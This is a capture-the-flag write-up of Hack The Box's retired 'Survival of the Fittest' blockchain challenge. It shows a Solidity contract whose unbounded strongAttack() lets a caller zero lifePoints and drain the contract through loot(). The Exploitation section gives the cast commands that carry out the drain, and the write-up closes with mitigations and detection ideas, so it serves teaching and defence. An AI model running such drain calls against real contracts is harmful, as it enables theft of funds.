---
challenge: Survival of the Fittest
category: Challenge
type: blockchain
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [blockchain, solidity, smart-contract, foundry, cast]
---

# Survival of the Fittest — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no real flags or credentials.

## TL;DR

A `Creature` contract with 20 life points and a single check: `loot()` pays out only when `lifePoints == 0`. `strongAttack()` subtracts whatever damage you pass with no bound or validation, so one call with 20 satisfies the condition and the next withdraws the ether. No reentrancy, no maths: a state check the contract itself lets you meet.

## Prompt and surface

- **Blockchain** category, **Very Easy** difficulty (10 points).
- Ships `Setup.sol` and `Creature.sol`; the instance gives RPC, player private key and contract address.
- The goal is to drain the contract deployed with 1 ether.

```bash
cat Setup.sol Creature.sol
```

## Recon

```solidity
contract Creature {
    uint256 public lifePoints = 20;
    function strongAttack(uint256 _damage) external { lifePoints -= _damage; }
    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

- `strongAttack` is `external` with no access control: anyone can call it.
- There is no `require(_damage <= lifePoints)`, so the attacker picks the value.
- `loot` does not track whether it already paid: the balance is the only condition.

## Code analysis

The useful state is a public `uint256`. `Setup.sol` deploys `Creature` with 1 ether and defines `isSolved()` as `address(creature).balance == 0`, exactly what `loot()` does.

No `fallback`, no `delegatecall`, no loops: the flaw is logic, not EVM.

## Why it fails

The contract assumes reaching zero takes many attacks and that damage will be small. Accepting any `uint256` means sending 20 in one call; with `lifePoints` at 0, `loot()` passes the `require` and transfers the balance.

```text
initial state: lifePoints = 20, balance = 1 ether
strongAttack(20) -> lifePoints = 0
loot() -> require passes, transfer(1 ether)
```

## Local reproduction

```bash
anvil
forge create Creature --rpc-url http://127.0.0.1:8545 --private-key <PK>
cast call <CREATURE> "lifePoints()(uint256)" --rpc-url http://127.0.0.1:8545
```

## Exploitation

```bash
cast send <CREATURE> "strongAttack(uint256)" 20 --rpc-url <RPC> --private-key <PK>
cast send <CREATURE> "loot()" --rpc-url <RPC> --private-key <PK>
cast balance <CREATURE> --rpc-url <RPC>
```

With the balance at zero the instance serves the flag at `http://<IP>:<PORT>/flag`.

## Evidence

- `lifePoints()` before and after `strongAttack(20)`.
- `cast balance` at 0 after `loot()`.
- No real flag in the note.

## Lessons learned

- A tiny contract still has surface: input validation is part of the design.
- `external` functions without a modifier are public to anyone, attacker included.
- Using the balance as a win condition is common in challenges; in production avoid payouts based on manipulable state.
- Read `Setup.sol` before writing an exploit: it defines exactly what counts as solved.

## Mitigations and detection

- Validate damage (`require(_damage <= lifePoints)`) and cap attacks per block or address.
- Separate reward logic from state the user can change.
- In a real contract, use pull-payment patterns with internal accounting and events.
- Detection: repeated calls to the same function in one block, transfers draining the balance and events with anomalous damage.
- References: SWC-105 (unprotected ether withdrawal), MITRE T1190.

## References

- <https://www.hackthebox.com/challenges/survival-of-the-fittest>
- <https://coinsbench.com/survival-of-the-fittest-writeup-htb-f31d274b119b>
- <https://www.agalera.eu/docs/write-up/htb/challenges/survival-of-the-fittest>
- <https://docs.soliditylang.org/en/latest/security-considerations.html>
